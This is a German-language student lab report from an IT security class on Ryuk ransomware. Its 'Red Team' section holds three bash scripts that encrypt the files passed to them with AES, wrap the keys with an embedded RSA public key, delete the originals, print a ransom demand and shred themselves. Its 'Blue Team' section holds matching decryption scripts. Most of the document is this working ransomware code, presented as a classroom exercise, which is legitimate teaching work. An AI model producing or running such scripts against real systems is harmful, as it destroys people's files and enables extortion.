# Ryuk-Ransomware

| Kategorie | Wert |
| ---- | ---- |
| Klasse | 5AHITS |
| Verfasser | Xu Matthias Chen, Jonas Franz Wolfbauer |
| Datum | 29.09.2026 |
| Fach | ITSE (Übungen) |
| Link | https://www.franzmatejka.at/htl/doc/ITSI/lab/ransom_ryuk/01_ryuk.html |

## Übung 1.1 (Ryuk Funktionsweise)

Files:

<img width="600" height="450" alt="image" src="https://github.com/user-attachments/assets/2c2bc3b5-3c26-42ad-9170-36f940007da2" />

Lösegeld wurde gezahlt:

<img width="600" height="450" alt="image" src="https://github.com/user-attachments/assets/60523782-84d3-4d1c-b6ea-42b0b8046de9" />


## Übung 1.2 (Ryuk - Red Team)

### Version 1
Erstellen des bash-scripts mit openssl für encryption ohne rsa encryption:

```bash
#!/bin/bash

        for arg in "$@";
        do
                echo "Argument: $arg"

                if [ "$arg" == "$0" ];
                then
                        continue
                elif[ -d "$arg" ];
                then
                        continue
                else                                                                                                                                                                                                                                                                                                                                       
                        openssl aes-256-cbc -in "$arg" -K '0106eb4887051520fcf40b5e8fa5acceab272785c1055ce53e3c201b1d3441fe' -iv '0' -out "${arg}.enc"
                        rm "$arg"
                fi
        done
        
        echo "Horst was here."
        echo "!!! === YOUR FILES ARE ENCRYPTED === !!!"
        echo "Pay a ransom of 5 Yuan to get your files back - wallet address: horst@lichter.de"
 
        echo ""
        echo "At this point, this file should but won't delete itself right now."
```


### Version 2
Erstellen des RSA Key für das verschlüsseln des aes-victim-key:
```
ssh-keygen -t rsa -b 4096 
```

Erstellen des attacker-script mit encryption von dem aes_key_file mithilfe das public keys:

```bash
#!/bin/bash

RSA_KEY_PUBLIC="-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvEsUVGJ9vC2BQZSq8NGo
bLQE/GcLjPIU+StpElDorz11UG+NYW9daPO3OjnXa6Zo4yXLTzFJxCqqJRzqbbED
5b9rOA3Rs1dGOuSNSbEJPrjKsOi+2s1ZpGOFsx8wcSkWtTeD0mTvN09tBrMtfK6b
uLAVRUQGCJ/haBTfBdy9Pnq30atfcP9Hx4/HK6xgatn/fs7U34VIqVyiVDvXVf7u
Rwoo4jaKgtghvn3BmoXbXKWdmNyRdaYAtH6onblrPypj3nGZVPWrp0hglME7Qcl0
yXSUAe7a22IpP6Ooh9+XvLjvlIYQNOHt4TZTH9wZovqP5xekSRvr3iUhnaXa1+rr
XpiTAutSxUlp46Ow2yn3n1bNXJbQHD+/eJQ90nFJxcDDmqoujmMSSKD8uCLAV8Uh
TpDWDolwB0lqTwjMgG7ieWCdZc0O1rKFfeC/hPsEtCKWsJsiRmeCrBzh/N3ZrTWC
QXr+Gjwlw3NkPk7DP2qaFHo2IUNaXIFqvvCDjtSxPSjXLP/uKrXkseZhaEqBGoDD
EvicwLN6OsIFEfgVeuusULmvEkun70GvN6KGhm8FZVaadizxa+PfOYPDs1LO82mK
3rqP33t2FEOzyFEkYeBsZe142st3tCye/Hdz/45UKZuY9VS45uholqh4NDZ+nI7V
IXmovvbD3W7PJN9EHyFk5kUCAwEAAQ==
-----END PUBLIC KEY-----"

        for arg in "$@";
        do
                echo "Argument: $arg"

                if [ "$arg" == "$0" ];
                then
                        continue
                elif [ -d "$arg" ];
                then
                        continue
                else
                        openssl aes-256-cbc -in "$arg" -K '0106eb4887051520fcf40b5e8fa5acceab272785c1055ce53e3c201b1d3441fe' -iv '0' -out "${arg}.enc"
                        rm "$arg"
                fi
        done

touch "aes_victim_key"
echo "0106eb4887051520fcf40b5e8fa5acceab272785c1055ce53e3c201b1d3441fe" > aes_victim_key


openssl pkeyutl -encrypt -pubin -inkey <(echo "$RSA_KEY_PUBLIC") -in aes_victim_key -out aes_victim_key.PayRansom
rm aes_victim_key

echo "Horst Lichter was here."
echo "!!! === YOUR FILES ARE ENCRYPTED === !!!"
echo "Pay a ransom of 5 Yuan to get your files back - wallet address: horst@lichter.de"

echo ""
echo "At this point, this file shreds itself."

shred -u -- "$0"
 ```

### Version 3 (finale Version)
```bash
#!/bin/bash

RSA_GLOBAL_KEY_PUBLIC="-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvEsUVGJ9vC2BQZSq8NGo
bLQE/GcLjPIU+StpElDorz11UG+NYW9daPO3OjnXa6Zo4yXLTzFJxCqqJRzqbbED
5b9rOA3Rs1dGOuSNSbEJPrjKsOi+2s1ZpGOFsx8wcSkWtTeD0mTvN09tBrMtfK6b
uLAVRUQGCJ/haBTfBdy9Pnq30atfcP9Hx4/HK6xgatn/fs7U34VIqVyiVDvXVf7u
Rwoo4jaKgtghvn3BmoXbXKWdmNyRdaYAtH6onblrPypj3nGZVPWrp0hglME7Qcl0
yXSUAe7a22IpP6Ooh9+XvLjvlIYQNOHt4TZTH9wZovqP5xekSRvr3iUhnaXa1+rr
XpiTAutSxUlp46Ow2yn3n1bNXJbQHD+/eJQ90nFJxcDDmqoujmMSSKD8uCLAV8Uh
TpDWDolwB0lqTwjMgG7ieWCdZc0O1rKFfeC/hPsEtCKWsJsiRmeCrBzh/N3ZrTWC
QXr+Gjwlw3NkPk7DP2qaFHo2IUNaXIFqvvCDjtSxPSjXLP/uKrXkseZhaEqBGoDD
EvicwLN6OsIFEfgVeuusULmvEkun70GvN6KGhm8FZVaadizxa+PfOYPDs1LO82mK
3rqP33t2FEOzyFEkYeBsZe142st3tCye/Hdz/45UKZuY9VS45uholqh4NDZ+nI7V
IXmovvbD3W7PJN9EHyFk5kUCAwEAAQ==
-----END PUBLIC KEY-----"

# Step 1
# Generate victim RSA key
openssl genrsa -out rsa_victim_key_private.key 2048 2>/dev/null
openssl rsa -pubout -in rsa_victim_key_private.key -out rsa_victim_key_public.key 2>/dev/null

# Step 2
# Encrypt every file with its own AES key
for arg in "$@"; do
    if [ "$arg" == "$0" ];
    then
        continue;
    fi
    if [ -d "$arg" ];
    then
        continue;
    fi
    if [ ! -f "$arg" ];
    then
        continue;
    fi

    AES_FILE_KEY=$(openssl rand -hex 32)
    echo -n "$AES_FILE_KEY" > aes_file_key.tmp

    # encrypt file AES
    openssl enc -aes-256-cbc -in "$arg" -K "$AES_FILE_KEY" -iv 00000000000000000000000000000000 -out "${arg}.tmp" 2>/dev/null

    # encrypt AES Key
    openssl pkeyutl -encrypt -pubin -inkey rsa_victim_key_public.key -in aes_file_key.tmp -out aes_file_key_rsa.enc 2>/dev/null

    # Append encrypted AES Key
    cat "${arg}.tmp" aes_file_key_rsa.enc > "${arg}.enc"
    mv "${arg}.enc" "$arg"

    # Remove old files
    rm -f "${arg}.tmp" aes_file_key.tmp aes_file_key_rsa.enc
done

# Step 3
# Encrypt rsa_victim_key_private with aes_victim_key -> victim_private.enc
AES_VICTIM_KEY=$(openssl rand -hex 32)
echo -n "$AES_VICTIM_KEY" > aes_victim_key.tmp

openssl enc -aes-256-cbc -in rsa_victim_key_private.key -K "$AES_VICTIM_KEY" -iv 00000000000000000000000000000000 -out rsa_victim_key_private.enc 2>/dev/null

# rsa_victim_key_private löschen
rm -f rsa_victim_key_private.key

# Step 4
# Encrypt AES_VICTIM_KEY with RSA_GLOBAL_KEY_PUBLIC
openssl pkeyutl -encrypt -pubin -inkey <(echo "$RSA_GLOBAL_KEY_PUBLIC") -in aes_victim_key.tmp -out aes_victim_key.enc 2>/dev/null
rm aes_victim_key.tmp

echo "Horst was here."
echo "!!! === YOUR FILES ARE ENCRYPTED === !!!"
echo "Pay a ransom of 5 Yuan to get your files back - wallet address: horst@lichter.de"

echo ""
echo "At this point, this file shreds itself."
shred -u -- "$0"
```

## Übung 1.3 (Ryuk - Blue Team)

Erstellen von dem Blue Team Script:

### Version 1
Für die Version 1 des attackers-scripts:
 ```bash
#!/bin/bash

for arg in "$@";
do
        if [[ "$arg" == "$0" ]];
        then
                continue
        elif [[ -d "$arg" ]];
        then
                continue
        else
                # blabla
                openssl aes-256-cbc -d -in "${arg}" -K '0106eb4887051520fcf40b5e8fa5acceab272785c1055ce53e3c201b1d3441fe' -iv '0' -out "${arg%.enc}"

                rm "$arg"
        fi
done
```

### Version 2 (finale Version)
```bash
#!/bin/bash

RSA_SIZE=256

# Step 1: Extract files and keys

# Loop for every entry
for file in "$@";
do
        # Check if entry is script itself
        if [ "$file" == "$0" ];
        then
                continue;
        fi
        # Check if entry is a directory
        if [ -d "$file" ];
        then
                continue;
        fi
        # Check if entry is not a file
        if [ ! -f "$file" ];
        then
                continue;
        fi

        # Extract RSA encrypted file key (last 256 bytes)
        tail -c $RSA_SIZE "$file" > tmp_rsa.bin

        # Decrypt to get AES fiel key
        AES_KEY=$(openssl pkeyutl -decrypt -inkey rsa_victim_key_private.key -in tmp_rsa.bin | tr -d '\n')

        # Step 2: Restore actual content
        head -c -256 "$file" | openssl enc -d -aes-256-cbc -K "$AES_KEY" -iv 00000000000000000000000000000000 -out "${file%.enc}"

        # Delete decrypted file
        rm -f "$file" tmp_rsa.bin
done

echo "Decryption Complete :)"
echo "Original files have been restored."
echo "Mr. Lichter thanks you for doing business with  you."
```
